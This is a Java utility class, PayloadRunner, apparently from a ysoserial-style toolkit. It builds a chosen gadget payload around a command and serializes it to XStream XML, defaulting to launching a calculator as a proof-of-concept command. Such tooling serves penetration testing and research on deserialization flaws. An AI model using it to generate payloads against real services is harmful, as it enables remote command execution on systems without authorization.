package yso.payloads.util;

import yso.payloads.ObjectPayload;
import com.thoughtworks.xstream.XStream;

import java.io.File;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static String run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
//		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
//			public byte[] call() throws Exception {
        final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

//        System.out.println("generating payload object(s) for command: '" + command + "'");

        ObjectPayload<?> payload = clazz.newInstance();
        final Object objBefore = payload.getObject(command);
//        XStream xStream;
        XStream xStream = new XStream();
        String s1 = xStream.toXML(objBefore);
//                System.out.println(s1);
//                System.out.println(s1.getBytes());
//                System.out.println("Type is: "+s1.getClass());
//        System.out.println(s1);
        return s1;
//
//				System.out.println("serializing payload");
//				byte[] ser = Serializer.serialize(objBefore);
//				Utils.releasePayload(payload, objBefore);
//                return ser;
//		}});

//		try {
//			System.out.println("deserializing payload");
//			final Object objAfter = Deserializer.deserialize(serialized);
//		} catch (Exception e) {
//			e.printStackTrace();
//		}
    }

    private static String getDefaultTestCmd() {
        String cmdfile =  getFirstExistingFile(
                "C:\\Windows\\System32\\calc.exe",
                "/System/Applications/Calculator.app/Contents/MacOS/Calculator",
                "/usr/bin/gnome-calculator",
                "/usr/bin/kcalc"
        );
        return String.format("raw_cmd:%s",cmdfile);
    }

    private static String getFirstExistingFile(String ... files) {
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }
}
